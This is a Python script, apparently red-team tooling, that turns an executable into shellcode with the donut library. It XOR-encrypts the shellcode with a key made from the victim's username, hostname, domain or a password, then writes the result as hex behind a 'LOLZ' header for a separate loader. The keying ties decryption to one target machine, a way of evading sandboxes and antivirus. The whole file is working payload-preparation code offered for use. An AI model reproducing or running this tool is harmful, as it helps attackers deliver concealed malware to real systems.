#!/usr/bin/env python3
import sys
import binascii
import traceback

try:
    import donut
except ModuleNotFoundError:
    print("Please install the pip module donut-shellcode")
    sys.exit(1)

SKIPDONUT=False

KEYCOMP = {
    'NONE': 0,
    'PASSWORD': 1,
    'USERNAME': 2,
    'HOSTNAME': 3,
    'DOMAIN': 4
}

def xor(shellcode, key):
    return bytes([shellcode[i]^ord(key[i%len(key)]) for i in range(len(shellcode))])

def getshellcode(inputfile):
    if SKIPDONUT:
        with open(inputfile, "rb") as f:
            return f.read()
    else:
        if sys.platform == 'win32':
            try:
                shellcode = donut.create(
                    filename,
                    params="PARAMS_PLACEHOLDER",
                    entropy=2,
                    compress=1
                )
            except TypeError:
                print("WARNING: It was not possible to set entropy due to an outdated donut-shellcode pip, runtime parameters have been disabled.")
                print("Compile the python module from the github repo to fix this issue.")
                shellcode = donut.create(
                    filename)
        else:
            try:
                shellcode = donut.create(
                    file=filename,
                    output='/dev/null',
                    params="PARAMS_PLACEHOLDER",
                    entropy=2,
                    compress=1
                )
            except TypeError:
                print("WARNING: It was not possible to set entropy due to an outdated donut-shellcode pip, runtime parameters have been disabled.")
                print("Compile the python module from the github repo to fix this issue.")
                shellcode = donut.create(
                    file=filename,
                    output='/dev/null')
        return shellcode

def write_output(shellcode, keycode, output):
    try:
        f = open(output, "wb")
        f.write(b"LOLZ")
        f.write(keycode.encode('UTF8'))
        f.write(b"\r\n")
        f.write(binascii.hexlify(shellcode))
        f.write(b"\r\n")
        f.close()
    except Exception:
        traceback.print_exc()

def usage():
    print("Usage: " + sys.argv[0] + " input.exe [OPTIONS]")
    print("\t-n\tDon't use keying, has preference over other options (Default is Key by DOMAIN)")
    print("Keying Options:")
    print("Note: The order in which the arguments are specified determines the order in the key")
    print("\t-u [user]\t Add Username to the key")
    print("\t-h [hostname]\t Add Hostname to the key")
    print("\t-d [domain]\t Add Domain to the key")
    print("\t-p [passwd]\t Add a custom Password to the key")

if __name__ == "__main__":
    key_components = []
    key_info = {}
    keying = True
    filename = None
    
    if len(sys.argv) == 1:
        usage()
        sys.exit()

    # Parse args
    i=1
    while i < len(sys.argv):
        if sys.argv[i] == "-n":
            keying = False
        elif sys.argv[i] == "-u":
            key_components.append(KEYCOMP['USERNAME'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[KEYCOMP['USERNAME']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-h":
            key_components.append(KEYCOMP['HOSTNAME'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[KEYCOMP['HOSTNAME']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-d":
            key_components.append(KEYCOMP['DOMAIN'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[KEYCOMP['DOMAIN']] = sys.argv[i+1]
                i+=1
        elif sys.argv[i] == "-p":
            key_components.append(KEYCOMP['PASSWORD'])
            if i+1 < len(sys.argv) and not sys.argv[i+1].startswith("-"):
                key_info[KEYCOMP['PASSWORD']] = sys.argv[i+1]
                i+=1
        elif (not sys.argv[i].startswith("-")) and filename is None:
            # Positional args, only filename for now
            filename = sys.argv[i]
        else:
            print("Wrong argument: " + sys.argv[i])
            usage()
            sys.exit(-1)
        i+=1

    if filename is None:
        print("Please specify a file name.")
        sys.exit(-1)
    if keying and len(key_components)==0:
        key_components.append(KEYCOMP['DOMAIN'])

    keycode = str(KEYCOMP['NONE'])
    if keying:
        # Ask for missing params
        for k,v in KEYCOMP.items():
            if v in key_components and v not in key_info:
                    key_info[v] = input(k + ": ").strip()
                    
        # Generate key
        keycode = ''.join([str(n) for n in key_components])
        key = ''.join([key_info[k] for k in key_components])

        print("XOR KEY:", key)

    # Generate shellcode
    shellcode = getshellcode(filename)

    print("Shellcode length:", len(shellcode))
    
    if keying:
        shellcode = xor(shellcode, key)
    
    outfile = filename + ".bin"
    write_output(shellcode, keycode, outfile)
    print("Output written to " + outfile)





